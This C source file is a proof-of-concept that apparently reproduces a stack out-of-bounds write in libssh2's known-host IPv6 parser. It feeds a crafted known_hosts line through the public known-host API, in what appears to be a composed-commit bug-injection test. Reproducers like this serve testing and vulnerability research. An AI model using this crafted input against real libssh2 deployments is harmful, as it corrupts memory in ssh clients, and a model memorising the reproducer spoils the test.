/* Proof-of-concept for a stack out-of-bounds write in libssh2's known-host
 * IPv6 literal matcher, reached through the public known-host API.
 *
 * An attacker-influenced known_hosts line carrying a plain host of the form
 *   1:2:3:4:5:6:7:1.2.3.4
 * (seven 16-bit groups followed by a dotted-quad tail) is stored verbatim as a
 * LIBSSH2_KNOWNHOST_TYPE_PLAIN entry via libssh2_knownhost_readline().
 *
 * A later libssh2_knownhost_check() with a valid IPv6 host drives
 * knownhost_parse_ipv6() over the stored name.  The embedded-IPv4 branch is
 * reached with count == 7; it only verifies there is room for a single word
 * (knownhost_ipv6_room()), then writes two words, overrunning words[8] on the
 * stack.
 *
 * On the original batch (correct `count > 6` guard) nothing fires; the defect
 * only exists once the two maintenance commits are composed.
 */

#include <libssh2.h>

#include <stdio.h>
#include <string.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    int rc;

    /* An in-contract OpenSSH-style known_hosts entry.  The key is a plausible
       base64 blob (only its length/shape matters for storage). */
    static const char line[] =
        "1:2:3:4:5:6:7:1.2.3.4 ssh-ed25519 "
        "AAAAC3NzaC1lZDI1NTE5AAAAIGNvbXBvc2VkZGVsb2NhbGl6ZWRidWdQb0M=";

    /* A valid IPv6 host to check against; parses fine, then the stored
       crafted name is parsed and overruns the stack buffer. */
    static const char check_host[] = "::2";
    static const char check_key[] =
        "AAAAC3NzaC1lZDI1NTE5AAAAIGNvbXBvc2VkZGVsb2NhbGl6ZWRidWdQb0M=";

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 1;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init failed\n");
        return 1;
    }

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        fprintf(stderr, "libssh2_knownhost_init failed\n");
        return 1;
    }

    rc = libssh2_knownhost_readline(hosts, line, strlen(line),
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    if(rc) {
        fprintf(stderr, "libssh2_knownhost_readline failed: %d\n", rc);
        return 1;
    }

    /* Drives knownhost_parse_ipv6() over the crafted stored host name. */
    rc = libssh2_knownhost_check(hosts, check_host,
                                 check_key, strlen(check_key),
                                 LIBSSH2_KNOWNHOST_TYPE_PLAIN |
                                 LIBSSH2_KNOWNHOST_KEYENC_BASE64,
                                 NULL);

    fprintf(stderr, "knownhost_check returned %d (no overflow detected)\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();

    return 0;
}
